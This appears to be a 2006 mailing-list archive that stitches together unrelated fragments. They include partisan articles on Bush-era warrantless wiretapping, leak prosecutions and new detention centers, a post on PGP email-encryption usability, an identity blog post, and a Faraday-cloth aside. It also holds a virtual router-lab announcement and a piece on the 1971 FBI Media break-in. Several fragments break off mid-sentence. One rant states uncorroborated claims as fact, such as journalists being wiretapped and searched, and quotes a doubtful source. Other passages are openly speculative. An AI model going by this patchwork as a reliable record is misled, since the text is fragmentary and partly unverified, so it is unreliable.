In his testimony, Gonzales argued that the congressional use-of-force
authorization, combined with the President's Commander-in-Chief power
in the Constitution, permitted Bush to approve a wiretapping program
for communications between Americans and terror suspects operating
outside the United States.
But  in challenging Bush's right to ignore the 1978 Foreign
Intelligence Surveillance Act, which requires a special court to
approve wiretaps  Leahy demanded to know if the administration's
legal interpretation also let Bush conduct other warrantless spying on
Americans, including tapping purely domestic phone calls, mail
openings and "black bag" break-ins into people's homes and offices.
"Under that (administration) logic, is there anything that stops you
from wiretapping without a warrant somebody inside the United States
that you suspect of having al-Qaeda connections?" Leahy asked.
"Clearly, Senator, that is not what's going on here," Gonzales
responded. "The President had authorized a much more narrow program.
We are always, of course, subject to the Fourth Amendment. So the
activities of any kind of surveillance within the United States would,
of course, be subject to the Fourth Amendment," which requires
"probable cause" and a court warrant before the property of Americans
can be searched.
Leahy persisted. "Under your interpretation of this, can you go in and
do mail searches? Can you go into e-mails? Can you open mail? Can you
do black-bag jobs?  Can you go and do that (to) Americans?"
Gonzales responded, "Sir, I've tried to outline for you and the
committee what the President has authorized, and that is all that he
has authorized."
"Did it authorize the opening of first-class mail of U.S. citizens?"
Leahy continued. "That you can answer, yes or no."
Gonzales: "There is all kinds of wild speculation about..."
Leahy: "Did it authorize it?"
Gonzales: "There is all kinds of wild speculation out there about what
the President has authorized and what we're actually doing. And I'm
not going to get into a discussion, Senator."
Recanted Testimony
Three weeks later, by recanting the statement about "that is all that
he (Bush) has authorized" in the context of Leahy's line of
questioning, Gonzales appears to be acknowledging that some of Leahy's
concerns are valid, that there are other components to Bush's
warrantless surveillance operations beyond the NSA program.
Given the fact that the Bush administration and its media allies have
openly challenged the loyalty of Americans who have disagreed with
Bush's policies, it would not be a big jump to suspect that Bush has
authorized spying on citizens, journalists and/or politicians who
have, in his view, undermined his strategy in the War on Terror or the
Iraq War.
Some Republicans publicly have urged Bush to counter these Americans
whom they call "Fifth Columnists" for supposedly sympathizing with or
otherwise helping the enemy.
At the Feb. 6 hearing, Sen. Lindsey Graham, R-S.C., declared that "I
stand by this President's ability, inherent to being Commander in
Chief, to find out about Fifth Column movements, and I don't think you
need a warrant to do that."
When Graham offered to work with the administration to draft
guidelines for how best to neutralize this alleged threat, Gonzales
smilingly replied, "Senator, the President already said we'd be happy
to listen to your ideas." [See Consortiumnews.com's "Bush's Mysterious
'New Programs'."]
With Bush's elastic use of language and his aggressive interpretation
of his own powers, there would seem to be little that Bush feels he
cannot do.
Gonzales, who was Bush's White House counsel before becoming Attorney
General, is part of a cadre of far-right lawyers who have asserted
virtually unlimited powers for Bush during the indefinite War on
Gonzales earned the nickname "Torture Boy" for going along with
ideologues like John Yoo and David Addington in defending
interpretations of Bush's authority that opened the door to torture
and other abuses of U.S. detainees imprisoned in Guantanamo Bay, Iraq,
Afghanistan and secret CIA jails scattered around the world. [See
Consortiumnews.com's "U.S. Disconnect on Bush's Abuses."]
Legal Resistance
The right-wing lawyers encountered opposition from professional
attorneys at the Justice Department and the Defense Department. The
professionals  the likes of Assistant Attorney General Jack Goldsmith
and U.S. Navy general counsel Alberto Mora  forced the Bush lawyers
into some retreats on the most expansive assertions of executive
power, especially involving torture.
Referring to one of Yoo's opinions that asserted the President's power
to subject Guantanamo inmates to cruel, inhumane and degrading
treatment, Navy general counsel Mora wrote, "The memo espoused an
extreme and virtually unlimited theory of the extent of the
President's Commander-in-Chief authority." [See Mora's 22-page
chronology, as posted by The New Yorker.]
But, one by one, these internal critics were pushed out of the
government. Goldsmith resigned to take a teaching position at Harvard
Law School; Mora quit to take a job as general counsel for Wal-Mart's
international operations. [See Consortiumnews.com's "Another Bush Lie"
on Goldsmith, or The New Yorker's "The Memo" on Mora.]
In the context of Bush's top legal advisers rationalizing Bush's right
to torture prisoners or to jail American citizens without charges, the
likelihood seems high they also would claim for Bush the power to spy
on domestic opponents.
As Gonzales told the Senate Judiciary Committee on Feb. 6, "detention
is far more intrusive than electronic surveillance."
But it's unclear whether the American people will ever learn what
these additional eavesdropping programs were or whom they targeted.
The Bush administration has wrapped its domestic spying program in
layer after layer of secrecy and lies.
In a speech in Buffalo, N.Y., on April 20, 2004, Bush went out of his
way to mislead the American people into a false sense of security
about his respect for Fourth Amendment prohibitions on warrantless
"By the way, any time you hear the United States government talking
about wiretap, it requires  a wiretap requires a court order," Bush
said. "Nothing has changed, by the way. When we're talking about
chasing down terrorists, we're talking about getting a court order
before we do so."
At the time of his speech, Bush had been authorizing wiretaps without
getting approval from the FISA court for more than two years. [For
more on Bush's deceptions, see Consortiumnews.com's "Talkin' 'Texan'
Means Lying Big."
Secrecy Charade
The administration's claim about the need for extraordinary secrecy
surrounding the wiretap program is also largely a charade. Al-Qaeda
and other enemy groups have long been aware that the United States has
the capability of electronic eavesdropping and have structured their
operations accordingly.
In the Feb. 6 hearing, Gonzales acknowledged as much under questioning
from Sen. Joe Biden, D-Delaware.
Biden asked, "How has this revelation damaged the program" since the
administration's attack on the disclosure "seems to presuppose that
these very sophisticated al-Qaeda folks didn't think we were
intercepting their phone calls?"
Gonzales responded, "I think, based on my experience, it is true  you
would assume that the enemy is presuming that we are engaged in some
kind of surveillance. But if they're not reminded about it all the
time in the newspapers and in stories, they sometimes forget"  a
response that drew laughter from the citizens in the hearing room.
"You're amazed at some of the communications that exist," Gonzales
continued. "So when you keep sticking it in their face that we're
involved in some kind of surveillance, even if it's unclear in these
stories, it can't help but make a difference, I think."
In other words, Gonzales argued that the reason for the extraordinary
secrecy around the wiretap program is not that the disclosure of its
existence would alert al-Qaeda to a previously unknown U.S. spying
capability, but that newspaper stories might remind them to be a
little more cautious while chatting on the telephone.
Such a slim argument would suggest that the Bush administration has
another motive for trying to intimidate anyone  whether in the press
or in Congress  who wants to investigate the surveillance program.
On Feb. 28, reflecting on Gonzales's earlier testimony, Leahy said the
Attorney General's unresponsive answers led to the conclusion that
Gonzales "has a radically different understanding of the laws than do
many of us  the people's representatives in Congress who wrote the
As for Gonzales's responses to senators' questions about the program,
Leahy said, "whatever we asked, it was either too relevant or not
relevant enough, and either way, we were getting no answers from the
Attorney General."
A logical suspicion is that the administration is blocking a thorough
examination of the wiretapping program because it might show that Bush
followed the legal advice on his unlimited powers into pervasive
spying of his political enemies.

Tue, 28 Feb 2006 11:45:54 -0800
I have to chime in on a number of points. I'll try to keep commercial
plugs to a minimum.
* An awful lot of this discussion is some combination of outdated and
true but irrelevant. For example, it is true that usability of all
computers is not what it could be. But a lot of what has cruised by
here is similar to someone saying, "Yes, usability is atrocious --
here, look at this screenshot of Windows 3.1." Someone else pipes up,
"You think that's bad, let me show you this example from the Xerox
Alto. What*ever* were they thinking?" And then someone else says,
"Yeah, and if you think that's bad, look at what 'ls' did in Unix V6!"
Then when someone else says, "Y'know, I'm using the latest version of
Firefox, and it's actually pretty good" the next message says, "But
what about the Y2K issues, and what happens when in 2038?" I swear,
guys, this thread is the crypto version of the Monty Python "Luxury"
* Whitten and Tygar is a great paper, but it was written ages ago on
software that was released in 1997. Things aren't perfect now, but
let's talk about what's out there now. Even at the time, one of
Whitten's main points is how hard it is to apply usability to
security, because of how odd it is. As a very quick example, in most
forms of user design, you let exploration take a prominent place. But
it doesn't work in security because you can't click undo when you do
something you didn't intend.
* There are new generations of crypto software out there. I produce
the PGP products, and PGP Desktop and PGP Universal are automatic
systems that look up certs use them, automatically encrypt, and even
does both OpenPGP and S/MIME.
They're not perfect, and lead to other amusing issues. For example, an
hour ago, I was coordinating with someone that I'm meeting at a
conference. I got a reply saying, "I'm at the airport and can't
decrypt your message from my phone." I hadn't realized that I *had*
encrypted my message, because my system and my colleague's system had
been doing things for us.
I habitually send most of my email securely, but I don't think about
it. My robots take care of it for me. I tune policies, I don't encrypt
If you don't want to use my products, as Ben Laurie pointed out,
there's a very nice plugin for Thunderbird called Enigmail that makes
doing crypto painless.
* There are also new generations of keyservers out there that work on
the issues of the old servers to trim defunct keys, and manage other
issues. I have out there the PGP Global Directory. Think of it as a
mash-up of a keyserver along with Robot CA concepts and user
management goodness adapted from modern mailing list servers like
* A number of us are also re-thinking other concepts such as using
short-lived certificates based on the "freshness" model to constrain
lifecycle management issues.
* There are many challenges remaining. Heck, the fact that people here
apparently have not updated their knowledge any time this century is
part of the problem. But let me tell you that email encryption is
growing, and growing strongly. However, most of the successes are not
happening where you see them. They're happening in business, where
communities of partners decide they need to do secure email, and then
they do. This is another place where things have changed radically. A
decade ago, we thought that security would be a grass-roots phenomenon
where end-users and consumers would push security into those stodgy
businesses. What's happening now is the exact opposite -- savvy
businesses are putting together sophisticated security systems, and
that's slowly starting to get end-users to wake up.
I'd be happy to discuss at length where things are getting better,
where they aren't, and where some issues have been shuffled around.
But we do need to talk about what's going on now, not ten years ago.

you can: there are also a few companies selling faraday cloth, though i don't

toggle'able, although the product described in this thread sounds more
like snake oil than truly "nano reconfigurable faraday surface"
a friend also has an attic/loft well coated in many layers of lead

@_subject: Identity is Hard, Let's go Shopping 
(Posted by adam)
Kim Cameron... says: "In my view, the identity problem is one of the
hardest problems computer science has ever faced." I think this is
true, and I'd like to tackle why that is. I'm going to do that in a
couple of blog posts, because I think the subject is broad and
complex, and I'd like to offer some perspectives into that chaos.
I've been saying for a while that people like to pay for privacy, when
they understand what the threat to their privacy is, and how the
solution works. Thus, they buy curtains. Curtains work very well to
enhance privacy by stopping passers-by from looking through your
windows. Another part of that talk is that privacy means a lot of
different things to people, ranging from 'the right to be left alone'
to 'informational self-determination' to 'abortion.' I believe that
identity displays very similar properties in how widely the term is
Identity is a problem because it means so many different things about
who we are, and how we perceive ourselves, others, and our
relationships with them. Identity also entails a set of business
relationships, and the experiences and reliance that entities embed
into those relationships. Finally, identity entails a set of
government relationships, some of which are about citizenship, or
various sorts of temporary presence or exclusion, or moneys flowing to
or from the government. Sometimes, these relationships overlap in
various ways.
This relates to Zooko's "Decentralized, Secure, Human-Meaningful"
triangle. Zooko looks at the digital systems for dealing with
identifiers, and the properties those identifiers can have. I want to
start from the variety of relationships, and the way people think
about the relationships, then move to identifiers. Replacing the
actual relationship with a digital identifier often creates issues,
because the two differ.
As we encode various forms of identity onto computers, we make choices
about identifiers and representations. Some of these choices are now
such second nature that actually listing the details them seems
bizarre: "My mail client sends a message to alice at example.com"* vs "I
send mail to mom." We have internalized the idea that an email address
is a good identifier for a person. We tend to internalize these
representations fairly easily, even when its not a good idea.
"123-45-6789 applied for this credit card," that must be Alice
I'll talk more about the issues of assigning trust or reliance to
identifiers, rather than people, in another post.

Hello all,
Some time before Christmas, a project was started. The task was to
enhance an existing LiveCD solution with User-mode Linux. A number of
requirements was stated, where the greatest challenge was to fit 10
virtual routers within an old no-name PC with only 256MB Ram. And the
solution must still be run from a LiveCD.
Thanks to Xen, the task was possible to complete.

With this solution, students taking CCNA/CCNP level studies can have
their own router lab on a bootable CD. No need for expensive equipment.
The student can set up a virtual network of 10 routers or hosts, and

 Bush declares war on freedom of the press
March 6, 2006 07:44 AM / The Rant .
By DOUG THOMPSON
Using many of the questionable surveillance and monitoring techniques
that brought both questions and criticism to his administration,
President George W. Bush has launched a war against reporters who
write stories unfavorable to his actions and is planning to prosecute
journalists to make examples of them in his "war on terrorism."
Bush recently directed Attorney General Alberto Gonzales to use
"whatever means at your disposal" to wiretap, follow, harass and
investigate journalists who have published stories about the
administration's illegal use of warrantless wiretaps, use of faulty
intelligence and anything else he deems "detrimental to the war on
Reporters for The New York Times, which along with Capitol Hill Blue
revealed use of the National Security Agency to monitor phone calls
and emails of Americans, say FBI agents have interviewed them and
criminal prosecutors at the Justice Department admit they are laying
"the groundwork for a grand jury that could lead to criminal charges,"
CIA Director Porter Goss told Congress recently that "it is my aim and
it is my hope that we will witness a grand jury investigation with
reporters present being asked to reveal who is leaking this
information. I believe the safety of this nation and the people of
this country deserve nothing less."
As part of the investigation, the Justice Department, Department of
Homeland Security and the National Security Agency are wiretapping
reporters' phones, following journalists on a daily basis, searching
their homes and offices under a USA Patriot Act provision that allows
"secret and undisclosed searches" and pouring over financial and
travel records of hundreds of Washington-based reporters.
Spokesmen for the Justice Department and Department of Homeland
Security admit there are "ongoing investigations" regarding
publication of stories "involving threats to national security" but
will not reveal what those investigations include.
In addition to using the USA Patriot Act to pry into the lives of
journalists, the Justice Department has also dusted off a pre-World
War I law to prosecute people who receive classified information,
although the law was aimed at military personnel not civilians.
"This is the first administration that I can remember, including
Nixon's, that said we need to think about a law that would put
journalists who print national security things up in front of grand
juries and put them in jail if they don't reveal their sources," says
David Gergen, who served as President Regan's director of
communication and also worked in the Nixon and Ford White Houses.
Political scientist George Harleigh, who worked in the Nixon
administration, says such use of federal law enforcement authority was
illegal when Nixon tried it and still so today.
"We're talking about a basic violation of the Constitutional guarantee
of a free press as well as a violation of the rights of privacy of
American citizens," Harleigh says. "I had hoped we would have learned
our lessons from the Nixon era. Sadly, it appears we have not."
In recent weeks, the FBI has issued hundreds of "National Security
Letters," directing employers, banks, credit card companies, libraries
and other entities to turn over records on reporters. Under the USA
Patriot Act, those who must turn over the records are also prohibited
from revealing they have done so to the subject of the federal probes.
"The significance of this cannot be overstated," says prominent New
York litigator Glenn Greenwald. "In essence, while the President sits
in the White House undisturbed after proudly announcing that he has
been breaking the law and will continue to do so, his slavish
political appointees at the Justice Department are using the mammoth
law enforcement powers of the federal government to find and
criminally prosecute those who brought this illegal conduct to light.
"This flamboyant use of the forces of criminal prosecution to threaten
whistle-blowers and intimidate journalists are nothing more than the
naked tactics of street thugs and authoritarian juntas."
Just how widespread, and uncontrolled, this latest government assault
has become hit close to home last week when one of the FBI's National
Security Letters arrived at the company that hosts the servers for
this web site, Capitol Hill Blue.
The letter demanded traffic data, payment records and other
information about the web site along with information on me, the
Now that's a problem. I own the company that hosts Capitol Hill Blue.
So, in effect, the feds want me to turn over information on myself and
not tell myself that I'm doing it. You'd think they'd know better.
I turned the letter over to my lawyer and told him to send the
following message to the feds:
Fuck you. Strong letter to follow.

White House steps up effort to halt flow of secrets
By Edward Alden in Washington
Financial Times
Updated: 9:12 p.m. ET March 6, 2006
The administration of President George W. Bush is mounting an
unprecedented effort to crack down on leaks of government secrets,
even as it is vastly expanding the range of information deemed too
sensitive to share with the public.
That twin effort has raised fears that the White House may succeed in
shutting off the flow of such information by threatening to jail those
who leak secrets and those who receive them.
The issue has come to a head in the government's efforts to prosecute
two pro-Israeli lobbyists for receiving classified information from a
Pentagon official. Larry Franklin, the official, was sentenced to 12
years in prison in January, and the lobbyists  Steven Rosen and Keith
Weissman of the American Israel Public Affairs Committee  are to go
on trial next month.
Many see the case, which relies on a novel interpretation of a
90-year-old espionage law, as a test of whether the administration can
exercise new powers to shut off leaks that have been severely
embarrassing to the White House. In particular, the Justice Department
is aggressively trying to identify the sources for two explosive news
stories: the existence of secret Central Intelligence Agency prisons
in eastern Europe, and the National Security Agency's domestic
surveillance programme.
The Washington Post reported at the weekend that dozens of officials
from both agencies had been questioned recently by the FBI in the leak
"When you have more and more information being classified, and more
and more secrets being kept, the only way reporters can get
information is when internal whistleblowers provide it. And that
drives this administration crazy," says Lucy Dalglish, executive
director of the Reporters Committee for Freedom of the Press.
Since the September 11 attacks, the administration has vastly expanded
the range of information deemed secret, ranging from the serious 
such as the NSA spying programme  to the seemingly trivial. It has
begun withholding, for instance, the names and telephone numbers of
many government officials, making it more difficult for reporters and
others to track down knowledgeable sources.
In the first four years of the administration, the volume of
classified documents barred from public distribution nearly doubled to
close to 16m annually. Over the same time, declassification of
documents has slowed to a trickle.
Porter Goss, director of the Central Intelligence Agency, warned in a
Senate hearing last month that leaks had caused "severe damage" to his
agency. "It is my aim and it is my hope that we will witness a grand
jury investigation, with reporters present, being asked to reveal who
is leaking this information," he said.
That threat is the main reason the prosecution of Mr Rosen and Mr
Weissman has caused such concern. The two are accused of discussing
with Mr Franklin a classified draft memorandum regarding US policy
towards Iran. In a court memorandum filed in support of the lobbyists,
a former Justice Department official, Viet Dinh  chief architect of
the Patriot Act  argued that the prosecution would have a chilling
effect on debate over national security issues.
"Until now, no administration has attempted to address what it may
perceive as annoying or premature 'leaks' by criminalising the receipt
and use of unsolicited oral information obtained as part of the
lobbying or reporting process," he wrote.
The government's effort, he said, would in effect "create some type of
official secrets act through the prosecution of a test case against
two individuals who were engaged in a practice that defines foreign
policy lobbying  the sharing of information  in which lobbyists and
members of the press engage every day."
The US has long resisted adopting a British-style Official Secrets
Act. But support for the idea is growing. In 2000, President Bill
Clinton vetoed legislation passed by the Republican Congress that
would have criminalised unauthorised leaks of classified information,
though even that bill would not have made the receipt of such
information a crime. The Republican chairmen of both the Senate and
House intelligence committees have said recently they might make
another effort to pass such legislation.
Critics say the obsession with leaks is absurd because top White House
officials have been at the forefront of leaking the most sensitive
classified information. For instance, Lewis "Scooter" Libby, the
former chief of staff to Vice-President Dick Cheney who faces perjury
charges in the Valerie Plame case, has said in his defence that Mr
Cheney authorised him to discuss with some reporters the CIA's
classified 2002 National Intelligence Estimate (NIE) on Iraq's weapons
programmes in the run-up to the Iraq war. Newspaper stories based on
the false claims in the NIE that Iraq possessed chemical and
biological weapons, and was developing nuclear arms, helped build US
public support for invading Iraq.
In a television interview last month, Mr Cheney said he had the power
to declassify such information, citing an executive order signed by
the president. This is precisely why the system for classifying
secrets is open to abuse, according to Thomas Blanton, director of the
National Security Archive, which presses for declassification of
information. "The fact is that most of the leaks that take place are
coming from very high-ranking officials, up to and including the
The crackdown on leaks, he said, was a result of White House anger
that mid-level officials were "in open revolt" against policies. "The
top officials can't tell the real secrets from the embarrassments, and
they are reacting to the embarrassments," he said. "It destroys the
credibility we need to maintain the real secrets."

maybe the new detention centers are for journalists of insufficient loyalty...
[it's hard for me to be outraged or shocked by anything done by our

"In the war against terrorists of global reach, as the Nation learned
all too well on Sept. 11, 2001, the territory of the United States is

    Given Bush's now open assertions that he is using his "plenary" -
or unlimited - powers as Commander in Chief for the duration of the
indefinite War on Terror, Americans can no longer trust that their
constitutional rights protect them from government actions.

    In such extraordinary circumstances, the American people might
legitimately ask exactly what the Bush administration means by the
"rapid development of new programs," which might require the
construction of a new network of detention camps.
Bush's Mysterious 'New Programs'
by Nat Parry; Truthout ; March 08, 2006
    Not that George W. Bush needs much encouragement, but Sen. Lindsey
Graham suggested to Attorney General Alberto Gonzales a new target for
the administration's domestic operations - Fifth Columnists,
supposedly disloyal Americans who sympathize and collaborate with the
    "The administration has not only the right, but the duty, in my
opinion, to pursue Fifth Column movements," Graham, R-S.C., told
Gonzales during Senate Judiciary Committee hearings on Feb. 6.
    "I stand by this President's ability, inherent to being Commander
in Chief, to find out about Fifth Column movements, and I don't think
you need a warrant to do that," Graham added, volunteering to work
with the administration to draft guidelines for how best to neutralize
this alleged threat.
    "Senator," a smiling Gonzales responded, "the President already
said we'd be happy to listen to your ideas."
    In less paranoid times, Graham's comments might be viewed by many
Americans as a Republican trying to have it both ways - ingratiating
himself to an administration of his own party while seeking some
credit from Washington centrists for suggesting Congress should have
at least a tiny say in how Bush runs the War on Terror.
    But recent developments suggest that the Bush administration may
already be contemplating what to do with Americans who are deemed
insufficiently loyal or who disseminate information that may be
considered helpful to the enemy.
    Top US officials have cited the need to challenge news that
undercuts Bush's actions as a key front in defeating the terrorists,
who are aided by "news informers" in the words of Defense Secretary
Donald Rumsfeld.
    Detention Centers
    Plus, there was that curious development in January when the Army
Corps of Engineers awarded Halliburton subsidiary Kellogg Brown & Root
a $385 million contract to construct detention centers somewhere in
the United States, to deal with "an emergency influx of immigrants
into the US, or to support the rapid development of new programs," KBR
said. [Market Watch, Jan. 26, 2006]
    Later, the New York Times reported that "KBR would build the
centers for the Homeland Security Department for an unexpected influx
of immigrants, to house people in the event of a natural disaster or
for new programs that require additional detention space." [Feb. 4,
    Like most news stories on the KBR contract, the Times focused on
concerns about Halliburton's reputation for bilking US taxpayers by
overcharging for sub-par services.
    "It's hard to believe that the administration has decided to
entrust Halliburton with even more taxpayer dollars," remarked Rep.
Henry Waxman, D-California.
    Less attention centered on the phrase "rapid development of new
programs" and what kind of programs would require a major expansion of
detention centers, each capable of holding 5,000 people. Jamie
Zuieback, a spokeswoman for Immigration and Customs Enforcement,
declined to elaborate on what these "new programs" might be.
    Only a few independent journalists, such as Peter Dale Scott and
Maureen Farrell, have pursued what the Bush administration might
actually be thinking.
    Scott speculated that the "detention centers could be used to
detain American citizens if the Bush administration were to declare
martial law."
    He recalled that during the Reagan administration, National
Security Council aide Oliver North organized Rex-84 "readiness
exercise," which contemplated the Federal Emergency Management Agency
rounding up and detaining 400,000 "refugees," in the event of
"uncontrolled population movements" over the Mexican border into the
United States.
    Farrell pointed out that because "another terror attack is all but
certain, it seems far more likely that the centers would be used for
post-911-type detentions of immigrants rather than a sudden deluge" of
immigrants flooding across the border.
    Vietnam-era whistleblower Daniel Ellsberg said, "Almost certainly
this is preparation for a roundup after the next 9/11 for
Mid-Easterners, Muslims and possibly dissenters. They've already done
this on a smaller scale, with the 'special registration' detentions of
immigrant men from Muslim countries, and with Guantanamo."
    Labor Camps
    There also was another little-noticed item posted at the US Army
Web site, about the Pentagon's Civilian Inmate Labor Program. This
program "provides Army policy and guidance for establishing civilian
inmate labor programs and civilian prison camps on Army
    The Army document, first drafted in 1997, underwent a "rapid
action revision" on Jan. 14, 2005. The revision provides a "template
for developing agreements" between the Army and corrections facilities
for the use of civilian inmate labor on Army installations.
    On its face, the Army's labor program refers to inmates housed in
federal, state and local jails. The Army also cites various federal
laws that govern the use of civilian labor and provide for the
establishment of prison camps in the United States, including a
federal statute that authorizes the Attorney General to "establish,
equip, and maintain camps upon sites selected by him" and "make
available ... the services of United States prisoners" to various
government departments, including the Department of Defense.
    Though the timing of the document's posting - within the past few
weeks - may just be a coincidence, the reference to a "rapid action
revision" and the KBR contract's contemplation of "rapid development
of new programs" have raised eyebrows about why this sudden need for
    These developments also are drawing more attention now because of
earlier Bush administration policies to involve the Pentagon in
    operations inside the United States.
    Pentagon Surveillance
    Despite the Posse Comitatus Act's prohibitions against US military
personnel engaging in domestic law enforcement, the Pentagon has
expanded its operations beyond previous boundaries, such as its role
in domestic surveillance activities.
    The Washington Post has reported that since the Sept. 11, 2001,
terror attacks, the Defense Department has been creating new agencies
that gather and analyze intelligence within the United States.
[Washington Post, Nov.
    27, 2005]
    The White House also is moving to expand the power of the
Pentagon's Counterintelligence Field Activity (CIFA), created three
years ago to consolidate counterintelligence operations. The White
House proposal would transform CIFA into an office that has authority
to investigate crimes such as treason, terrorist sabotage or economic
    The Pentagon also has pushed legislation in Congress that would
create an intelligence exception to the Privacy Act, allowing the FBI
and others to share information about US citizens with the Pentagon,
CIA and other intelligence agencies. But some in the Pentagon don't
seem to think that new laws are even necessary.
    In a 2001 Defense Department memo that surfaced in January 2006,
the US Army's top intelligence officer wrote, "Contrary to popular
belief, there is no absolute ban on [military] intelligence components
collecting US person information."
    Drawing a distinction between "collecting" information and
"receiving" information on US citizens, the memo argued that "MI
[military intelligence] may receive information from anyone, anytime."
[See CQ.com, Jan. 31, 2005]
    This receipt of information presumably would include data from the
National Security Agency, which has been engaging in surveillance of
US citizens without court-approved warrants in apparent violation of
the Foreign Intelligence Security Act. Bush approved the program of
warrantless wiretaps shortly after 9/11.
    There also may be an even more extensive surveillance program.
Former NSA employee Russell D. Tice told a congressional committee on
Feb. 14 that such a top-secret surveillance program existed, but he
said he couldn't discuss the details without breaking classification
    Tice added that the "special access" surveillance program may be
violating the constitutional rights of millions of Americans. [UPI,
Feb. 14, 2006]
    With this expanded surveillance, the government's list of
terrorist suspects is rapidly swelling.
    The Washington Post reported on Feb. 15 that the National
Counterterrorism Center's central repository now holds the names of
325,000 terrorist suspects, a four-fold increase since the fall of
    Asked whether the names in the repository were collected through
the NSA's domestic surveillance program, an NCTC official told the
Post, "Our database includes names of known and suspected
international terrorists provided by all intelligence community
organizations, including NSA."
    Homeland Defense
    As the administration scoops up more and more names, members of
Congress also have questioned the elasticity of Bush's definitions for
words like terrorist "affiliates," used to justify wiretapping
Americans allegedly in contact with such people or entities.
    During the Senate Judiciary Committee's hearing on the wiretap
program, Sen. Dianne Feinstein, D-California, complained that the
House and Senate Intelligence Committees "have not been briefed on the
scope and nature of the program."
    Feinstein added that, therefore, the committees "have not been
able to explore what is a link or an affiliate to al-Qaeda or what
minimization procedures (for purging the names of innocent people) are
in place."
    The combination of the Bush administration's expansive reading of
its own power and its insistence on extraordinary secrecy has raised
the alarm of civil libertarians when contemplating how far the
Pentagon might go in involving itself in domestic matters.
    A Defense Department document, entitled the "Strategy for Homeland
Defense and Civil Support," has set out a military strategy against
terrorism that envisions an "active, layered defense" both inside and
outside US territory. In the document, the Pentagon pledges to
"transform US military forces to execute homeland defense missions in
the ... US homeland."
    The Pentagon strategy paper calls for increased military
reconnaissance and surveillance to "defeat potential challengers
before they threaten the United States." The plan "maximizes threat
awareness and seizes the initiative from those who would harm us."
    But there are concerns over how the Pentagon judges "threats" and
who falls under the category "those who would harm us." A Pentagon
official said the Counterintelligence Field Activity's TALON program
has amassed files on antiwar protesters.
    In December 2005, NBC News revealed the existence of a secret
400-page Pentagon document listing 1,500 "suspicious incidents" over a
10-month period, including dozens of small antiwar demonstrations that
were classified as a "threat."
    The Defense Department also might be moving toward legitimizing
the use of propaganda domestically, as part of its overall war
    A secret Pentagon "Information Operations Roadmap," approved by
Rumsfeld in October 2003, calls for "full spectrum" information
operations and notes that "information intended for foreign audiences,
including public diplomacy and PSYOP, increasingly is consumed by our
domestic audience and vice-versa."
    "PSYOPS messages will often be replayed by the news media for much
larger audiences, including the American public," the document states.
The Pentagon argues, however, that "the distinction between foreign
and domestic audiences becomes more a question of USG [US government]
intent rather than information dissemination practices."
    It calls for "boundaries" between information operations abroad
and the news media at home, but does not outline any corresponding
limits on PSYOP campaigns.
    Similar to the distinction the Pentagon draws between "collecting"
and "receiving" intelligence on US citizens, the Information
Operations Roadmap argues that as long as the American public is not
intentionally "targeted," any PSYOP propaganda consumed by the
American public is acceptable.
    The Pentagon plan also includes a strategy for taking over the
Internet and controlling the flow of information, viewing the Web as a
potential military adversary. The "roadmap" speaks of "fighting the
net," and implies that the Internet is the equivalent of "an enemy
weapons system."
    In a speech on Feb. 17 to the Council on Foreign Relations,
Rumsfeld elaborated on the administration's perception that the battle
over information would be a crucial front in the War on Terror, or as
Rumsfeld calls it, the Long War.
    "Let there be no doubt, the longer it takes to put a strategic
communication framework into place, the more we can be certain that
the vacuum will be filled by the enemy and by news informers that most
assuredly will not paint an accurate picture of what is actually
taking place," Rumsfeld said.
    The Department of Homeland Security also has demonstrated a
tendency to deploy military operatives to deal with domestic crises.
    In the wake of Hurricane Katrina, the department dispatched
"heavily armed paramilitary mercenaries from the Blackwater private
security firm, infamous for their work in Iraq, (and had them) openly
patrolling the streets of New Orleans," reported journalists Jeremy
Scahill and Daniela Crespo on Sept.
    10, 2005.
    Noting the reputation of the Blackwater mercenaries as "some of
the most feared professional killers in the world," Scahill and Crespo
said Blackwater's presence in New Orleans "raises alarming questions
about why the government would allow men trained to kill with impunity
in places like Iraq and Afghanistan to operate here."
    US Battlefield
    In the view of some civil libertarians, a form of martial law
already exists in the United States and has been in place since
shortly after the 9/11 attacks when Bush issued Military Order No. 1
which empowered him to detain any non-citizen as an international
terrorist or enemy combatant.
    "The President decided that he was no longer running the country
as a civilian President," wrote civil rights attorney Michael Ratner
in the book
    Guantanamo: What the World Should Know. "He issued a military
order giving himself the power to run the country as a general."
    For any American citizen suspected of collaborating with
terrorists, Bush also revealed what's in store. In May 2002, the FBI
arrested US citizen Jose Padilla in Chicago on suspicion that he might
be an al-Qaeda operative planning an attack.
    Rather than bring criminal charges, Bush designated Padilla an
"enemy combatant" and had him imprisoned indefinitely without benefit
of due process. After three years, the administration finally brought
charges against Padilla, in order to avoid a Supreme Court showdown
the White House might have lost.
    But since the Court was not able to rule on the Padilla case, the
administration's arguments have not been formally repudiated. Indeed,
despite filing charges against Padilla, the White House still asserts
the right to detain US citizens without charges as enemy combatants.
    This claimed authority is based on the assertion that the United
States is at war and the American homeland is part of the battlefield.
    "In the war against terrorists of global reach, as the Nation
learned all too well on Sept. 11, 2001, the territory of the United
States is part of the battlefield," Bush's lawyers argued in briefs to
the federal courts. [Washington Post, July 19, 2005]

A break-in to end all break-ins
In 1971, stolen FBI files exposed the government's domestic spying program.
By Allan M. Jalon
ALLAN M. JALON is a longtime contributor to The Times and other
publications on issues of culture and media.
March 8, 2006
THIRTY-FIVE YEARS ago today, a group of anonymous activists broke into
the small, two-man office of the Federal Bureau of Investigation in
Media, Pa., and stole more than 1,000 FBI documents that revealed
years of systematic wiretapping, infiltration and media manipulation
designed to suppress dissent.
The Citizens' Commission to Investigate the FBI, as the group called
itself, forced its way in at night with a crowbar while much of the
country was watching the Muhammad Ali-Joe Frazier fight. When agents
arrived for work the next morning, they found the file cabinets
virtually emptied.
Within a few weeks, the documents began to show up  mailed
anonymously in manila envelopes with no return address  in the
newsrooms of major American newspapers. When the Washington Post
received copies, Atty. Gen. John N. Mitchell asked Executive Editor
Ben Bradlee not to publish them because disclosure, he said, could
"endanger the lives" of people involved in investigations on behalf of
the United States.
Nevertheless, the Post broke the first story on March 24, 1971, after
receiving an envelope with 14 FBI documents detailing how the bureau
had enlisted a local police chief, letter carriers and a switchboard
operator at Swarthmore College to spy on campus and black activist
groups in the Philadelphia area.
More documents went to other reporters  Tom Wicker received copies at
his New York Times office; so did reporters at the Los Angeles Times 
and to politicians including Sen. George McGovern of South Dakota and
Rep. Parren J. Mitchell of Maryland.
To this day, no individual has claimed responsibility for the
break-in. The FBI, after building up a six-year, 33,000-page file on
the case, couldn't solve it. But it remains one of the most lastingly
consequential (although underemphasized) watersheds of political
awareness in recent American history, one that poses tough questions
even today for our national leaders who argue that fighting foreign
